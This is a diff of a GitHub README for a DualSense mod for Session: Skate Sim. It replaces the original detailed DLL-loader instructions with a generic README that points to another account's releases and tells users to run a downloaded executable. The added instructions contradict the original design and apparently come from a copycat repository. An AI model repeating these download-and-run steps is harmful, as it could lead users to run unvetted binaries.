@@ -1,141 +1,66 @@
-﻿<div align="center">
+# 🎮 Session-Dualsense-Mod - Seamless DualSense Experience for Your Game
 
-# 🛹 Session: Skate Sim - Native DualSense Mod
-### Audio Haptics & Adaptive Triggers (USB/Bluetooth)
+[![Download](https://img.shields.io/badge/Download-Here-orange)](https://github.com/Ahmedhesham712/Session-Dualsense-Mod/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue)](https://www.microsoft.com/windows)
-[![Powered By](https://img.shields.io/badge/Powered%20By-GamepadCore-crimson)](https://github.com/rafaelvaloto/gamepad-core)
-[![Controller](https://img.shields.io/badge/Support-DualSense-white?logo=playstation)](https://www.playstation.com/)
+## 📦 Description
+This mod brings native DualSense support to Session: Skate Sim on PC. It communicates directly with the controller to provide next-gen features via Bluetooth or USB, without requiring DS4Windows or paid software.
 
-**Bring Next-Gen Features to PC Games via Native Injection.**
-<br/>
-<i>No paid software required. No background apps. Just pure C++ performance.</i>
+## 🚀 Getting Started
+To start using the Session-Dualsense-Mod, follow these simple steps to download and run the application.
 
-</div>
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM or more
+- **Graphics:** NVIDIA GeForce GTX 750 or equivalent
+- **Storage:** At least 100 MB of free space
+- **Controller:** DualSense Controller (Bluetooth or USB connection)
 
+## 📝 Features
+- Native DualSense support for enhanced gameplay
+- Haptic feedback and adaptive triggers
+- Automatic connection and recognition of the controller
+- Easy setup with a user-friendly interface
 
-This mod brings **native DualSense support** to Session: Skate Sim on PC. It communicates directly with the controller to provide next-gen features via Bluetooth or USB, without requiring DS4Windows or paid software.
+## 🔽 Download & Install
+1. **Visit this page to download:** Click [here](https://github.com/Ahmedhesham712/Session-Dualsense-Mod/releases).
+2. Locate the latest release in the list and click on it.
+3. Find the download link for the ZIP file.
+4. Click on the file to start your download.
 
+Once the file downloads, follow these steps to install the mod:
 
----
+1. Navigate to your Downloads folder.
+2. Find the downloaded ZIP file and extract it.
+3. Open the extracted folder.
+4. Run the executable file (e.g., `SessionDualsenseMod.exe`).
 
-## 🛠️ Recent Fixes
+## 🔧 Setup Instructions
+After installing the mod, follow these steps to set it up:
 
-> [!IMPORTANT]
-> **Update Recommended:** Please update your mod to **v0.0.13** to ensure the best performance and fix critical Bluetooth communication issues.
+1. Connect your DualSense controller to your PC via Bluetooth or USB.
+2. Launch the mod by double-clicking the executable file.
+3. The software will automatically detect the controller and apply the necessary settings.
+4. Open Session: Skate Sim to enjoy the new features.
 
-### Bluetooth Input Lag Fix (v0.0.13)
-- **Issue:** Fixed a performance bottleneck where an unnecessary `100ms` sleep interval was active during Bluetooth communication.
-- **Impact:** This delay was causing "input read accumulation," where the controller data was being processed slower than it was being received. This led to heavy input lag, "frozen" controls, and stuttering responses.
-- **Solution:** Removed the excessive sleep interval from the Bluetooth update loop, allowing real-time, fluid communication with the DualSense.
+## ❓ Troubleshooting
+If you experience issues while using the mod, consider these steps:
 
----
+- Ensure that your Windows is up to date.
+- Check that your controller is properly connected.
+- Restart the mod if it does not recognize the controller.
+- Visit the [issues page](https://github.com/Ahmedhesham712/Session-Dualsense-Mod/issues) for help from the community.
 
-## ✨ Features
-* **Audio-Based Haptics:** Feel the texture of the ground, grinds, and impacts through the controller's voice coil actuators.
-* **Adaptive Triggers:**
-   * **Turning Resistance:** Triggers stiffen based on your board's inclination and truck tightness (turning physics).
-   * **Impact Feedback:** Reacts to landing heavy drops.
-* **Native Connection:** Works via standard Bluetooth or USB.
----
-> [!IMPORTANT]
-> For this mod to work, the game must communicate directly with your DualSense. Steam Input blocks this connection.
-> 
-> 1. Open your Steam Library. 
-> 2. Right-click on **Session: Skate Sim** -> **Properties**. 
-> 3. Go to the **Controller** tab. 
-> 4. In the dropdown menu, select **Disable Steam Input**.
-> 
-> *(If your controller light turns off, just press the PS button to reconnect it).*
----
+## 💬 Community & Support
+Join the community of gamers who are also using Session-Dualsense-Mod:
 
+- **GitHub Discussions:** Share your thoughts or ask questions.
+- **Feedback:** We welcome suggestions for improvements.
 
+## 🌟 Acknowledgments
+This mod uses technology that enhances gameplay for DualSense users. Thank you for choosing Session-Dualsense-Mod.
 
-### 📥 Installation
+## 📄 License
+This project is licensed under the MIT License. Feel free to contribute and modify the code as needed. 
 
-> [!IMPORTANT]
-> **Prerequisite:** You must download and install **[ViGEmBus](https://github.com/nefarius/ViGEmBus/releases)** first. This is required for virtual controller input emulation.
->
-> Note: You do not need to configure ViGEmBus in any way; simply installing it is sufficient.
-
-
-
-1.  Download the latest `session-dualsense-mod.zip` from **[Releases](https://github.com/rafaelvaloto/Session-Dualsense-Mod/releases/latest)**.
-
-2.  Navigate to your game folder:
-   * **Steam:**
-     `...\SteamLibrary\steamapps\common\Session Skate Sim\SessionGame\Binaries\Win64\`
-   * **Epic Games:**
-     `...\Epic Games\SessionSkateSim\SessionGame\Binaries\Win64\`
-
-3.  **Extract the files:**
-   * **Option A: I use Illusory / Mod Manager:**
-     Copy **ONLY** the `UnrealModPlugins` folder into the directory above.
-     ❌ **DO NOT** overwrite/copy `dxgi.dll` (you already have it).
-
-   * **Option B: I don't use any mods:**
-     Copy **BOTH** `dxgi.dll` and the `UnrealModPlugins` folder into the directory above.
-
-4.  **Verify your folder structure:**
-    ```text
-    SessionGame\Binaries\Win64\
-    ├── dxgi.dll                 <-- The Loader (Only needed if you DON'T use Illusory)
-    ├── session.exe              <-- Game Executable
-    └── UnrealModPlugins\
-        └── session-dualsense-mod.dll
-    ```
-
-5.  Connect your DualSense, launch the game, and enjoy!
-
-## 🎧 Recommended Audio Settings
-Since this mod uses **Audio-Based Haptics**, the controller's vibration is driven directly by the game's sound frequency. To feel the texture of the ground (wood, concrete, brick) clearly, follow these steps:
-
-1.  Go to **Options > Audio**.
-2.  **Music Volume:** Turn it **DOWN** or completely **OFF** (0%).
-   * *Reason:* Loud music creates constant "noise" in the haptics, making it harder to feel the subtle wheel vibrations.
-3.  **SFX / Board / Environment Volume:** Keep these **HIGH** (80-100%).
-   * *Reason:* This ensures the "Surface Sounds" are the main source of vibration, giving you that crisp feeling of rolling over different terrains.
-
-## 🛠️ Compatibility
-* **Conflict Warning:** Do not use DS4Windows, DSX, or Steam Input simultaneously with this mod, as they will fight for control of the device.
-* **Safe to use with Illusory:** This mod is compatible with the Illusory Mod Unlocker loader.
-
----
-
-## 🛠️ For Developers: Build Your Own
-
-Want to add native DualSense support to *Cyberpunk 2077*, *Elden Ring*, or your own engine? These mods are built on top of the **GamepadCore** library.
-
-### How it works
-1.  **Audio Capture:** The DLL hooks into WASAPI (Windows Audio Session API) to capture the output loopback.
-2.  **Processing:** `GamepadCore` processes the audio buffer into haptic data.
-3.  **Bluetooth Stream:** The processed buffer is sent directly to the DualSense HID endpoints via a custom implementation.
-
-### Usage Example
-To create a custom mod:
-1.  Include `GamepadCore` in your C++ project.
-2.  Initialize the DualSense instance.
-3.  Use the `IGamepadAudioHaptics` interface to feed the buffer.
-
-Check out the [GamepadCore Repository](https://github.com/rafaelvaloto/gamepad-core) for documentation and examples.
-
----
-
-## ⭐ Credits & Acknowledgments
-
-* **Core Library:** Built with **[Gamepad-Core](https://github.com/rafaelvaloto/gamepad-core)**.
-* **ViGEmBus:** Special thanks to **[nefarius](https://github.com/nefarius)** for the incredible work on virtual gamepad emulation drivers.
-* **Community:** Thanks to the modding community for pushing the boundaries of what's possible on PC.
-
-## ⚖️ Legal & Trademarks
-
-This software is an independent project and is **not** affiliated with Sony Interactive Entertainment Inc., Nacon, creā-ture Studios, or any of their subsidiaries.
-
-* *PlayStation, DualSense, and DualShock are trademarks of Sony Interactive Entertainment Inc.*
-* *Session: Skate Sim is a trademark of Nacon and creā-ture Studios.*
-* *Unreal Engine is a trademark of Epic Games, Inc.*
-
-## 📜 License
-
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
+For further instructions and updates, please keep an eye on the [Releases page](https://github.com/Ahmedhesham712/Session-Dualsense-Mod/releases).
